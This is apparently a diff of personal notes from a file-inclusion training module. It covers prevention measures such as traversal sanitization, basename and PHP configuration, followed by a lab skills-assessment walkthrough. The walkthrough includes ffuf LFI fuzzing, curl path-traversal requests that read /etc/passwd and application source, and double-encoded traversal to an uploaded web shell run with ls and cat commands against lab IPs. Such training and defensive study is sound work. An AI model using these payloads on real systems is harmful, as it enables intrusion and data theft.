-DocumentRoot /var/www/html
-ErrorLog ${APACHE_LOG_DIR}/error.log
-CustomLog ${APACHE_LOG_DIR}/access.log combined
-export APACHE_LOG_DIR=/var/log/apache2$SUFFIX
-```
-
-**TOOLS**
-
-```text
-ffuf
-curl
 LFISuite
 LFiFreak
 liffy
 ```
 
+---
 
-```
-ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
--u 'http://154.57.164.74:30195/index.php?FUZZ=test'
-```
+---
 
-```
-ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.74:30195/index.php?FUZZ=value' -fs 3405
-```
 
-```
-ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.64:31400/index.php?view=FUZZ' -fs 2309
-```
-then it was long response so manually opened 1935/515 found its blank and added them to the -fs 
-```
-ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.64:31400/index.php?view=FUZZ' -fs 2309,1935,515
+# File Inclusion Prevention 
 
+**Recursive Directory Traversal Sanitization**
+
+```php
+while(substr_count($input, '../', 0)) {
+    $input = str_replace('../', '', $input);
+};
 ```
 
+**PHP basename() Usage**
 
-php://filter/read=convert.base64-encode/resource=/flag.txt
+```text
+basename()
+```
 
-154.57.164.74:30195
+**PHP Configuration - Disable Remote Inclusion**
 
+```text
+allow_url_fopen = Off
+allow_url_include = Off
+```
 
+**PHP Configuration - Lock to Web Root**
 
-# 
-#
-#
+```text
+open_basedir = /var/www
+```
 
+**Bash Wildcard Traversal Edge Case**
+
+```bash
+cat .?/.*/.?/etc/passwd
+```
+
+**PHP Wildcard Behavior Test**
+
+```text
+php -a
+echo file_get_contents('.?/.*/.?/etc/passwd');
+```
+
+**WAF**
+
+```text
+ModSecurity
+```
+
+**Dangerous Modules to Disable**
+
+```text
+PHP Expect
+mod_userdir
+```
+# Skills Assessment - File Inclusion 
+
+**Fuzz LFI Payloads on image.php**
+
+```bash
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://154.57.164.73:31949/api/image.php?p=FUZZ' -fs 0
+```
+
+**Confirm LFI via curl**
+
+```bash
+curl http://154.57.164.73:31949/api/image.php?p=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+```
+
+**Fuzz Parameters on contact.php**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.67:32736/contact.php?FUZZ=vlaue' | grep -v 1771
+```
+
+**Fuzz Parameters on image.php**
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://154.57.164.74:31218/api/image.php?region=FUZZ'
+```
+
+**Directory Enumeration - Merge Wordlists**
+
+```bash
+cat /usr/share/seclists/Discovery/Web-Content/{common.txt,burp-parameter-names.txt} | sort -u > app-files.txt
+```
+
+**Directory Enumeration - feroxbuster**
+
+```bash
+feroxbuster -u http://154.57.164.74:31218/ -w app-files.txt -r -t 50 -k -x php -S 3405
+```
+
+**Read application.php via LFI**
+
+```bash
+curl http://154.57.164.74:31218/api/image.php?p=....//api//application.php
+```
+
+**Discovered application.php Source**
+
+```php
+<?php
+$firstName = $_POST["firstName"];
+$lastName = $_POST["lastName"];
+$email = $_POST["email"];
+$notes = (isset($_POST["notes"])) ? $_POST["notes"] : null;
+
+$tmp_name = $_FILES["file"]["tmp_name"];
+$file_name = $_FILES["file"]["name"];
+$ext = end((explode(".", $file_name)));
+$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;
+move_uploaded_file($tmp_name, $target_file);
+
+header("Location: /thanks.php?n=" . urlencode($firstName));
+?>
+```
+
+**Upload Path Pattern**
+
+```text
+../uploads/<md5_of_file>.<ext>
+```
+
+**Double URL Encoded Traversal Token**
+
+```text
+%252E%252E%252F
+```
+
+**RCE via Uploaded Shell - List Root**
+
+```http
+http://154.57.164.81:32019/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=ls%20/
+```
+
+**RCE via Uploaded Shell - Read Flag**
+
+```http
+http://154.57.164.81:32019/contact.php?region=%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=cat%20/flag_09ebca.txt
+```
+
+**Flag Filename**
+
+```text
+flag_09ebca.txt
+```
+
+**Uploaded Shell MD5 Filename**
+
+```text
+fc023fcacb27a7ad72d605c4e300b389
+```
 
